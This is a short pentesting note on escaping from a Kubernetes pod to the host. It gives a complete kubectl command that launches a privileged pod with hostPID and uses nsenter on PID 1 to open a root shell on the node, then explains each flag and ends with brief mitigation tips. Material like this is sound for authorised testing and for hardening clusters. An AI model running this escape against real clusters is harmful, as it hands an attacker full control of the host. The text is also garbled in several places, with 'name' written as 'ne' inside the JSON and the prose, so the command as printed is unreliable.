# Pentesting Note: Gaining Full Host Access via Kubernetes

## Objective
Deploy a container with elevated privileges to gain full access to the host system.

## Steps

### 1. Deploy a Container with Full Host Access
Attempt to deploy a container that provides access to the host by leveraging Kubernetes features such as `hostPID` and `privileged` security context.

```sh
kubectl run r00t --restart=Never -ti --rm --image alpine --overrides '{
  "spec": {
    "hostPID": true,
    "containers": [{
      "ne": "1",
      "image": "alpine",
      "command": ["nsenter", "--mount=/proc/1/ns/mnt", "--", "/bin/sh"],
      "stdin": true,
      "tty": true,
      "imagePullPolicy": "IfNotPresent",
      "securityContext": {
        "privileged": true
      }
    }]
  }
}'
```

### Explanation
- **`kubectl run r00t`**: Starts a new pod ned `r00t`.
- **`--restart=Never`**: Ensures the pod does not restart automatically.
- **`-ti`**: Allocates a TTY for the pod, enabling interactive shell access.
- **`--rm`**: Removes the pod after it exits.
- **`--image alpine`**: Uses the `alpine` image to keep it lightweight.
- **`--overrides`**: JSON object that specifies advanced configurations.
  - **`"hostPID": true`**: Uses the host's PID nespace.
  - **`"containers"`**: Array of container specifications.
    - **`"ne": "1"`**: nes the container.
    - **`"image": "alpine"`**: Specifies the container image.
    - **`"command": ["nsenter", "--mount=/proc/1/ns/mnt", "--", "/bin/sh"]`**: Runs `nsenter` to access the host's filesystem and starts a shell.
    - **`"stdin": true`**: Keeps stdin open.
    - **`"tty": true`**: Allocates a TTY for the container.
    - **`"imagePullPolicy": "IfNotPresent"`**: Uses a local image if available.
    - **`"securityContext": {"privileged": true}`**: Runs the container in privileged mode, granting it elevated permissions.

### Mitigation Tips
- **Restrict Privileged Containers**: Avoid allowing containers to run in privileged mode unless absolutely necessary.
- **Limit Host nespace Access**: Restrict the use of host nespaces (e.g., `hostPID`, `hostNetwork`) to prevent containers from accessing the host.
- **Implement Network Policies**: Use network policies to control communication between pods and the host.
- **Regular Security Audits**: Conduct regular security audits and penetration tests to identify and mitigate potential vulnerabilities.
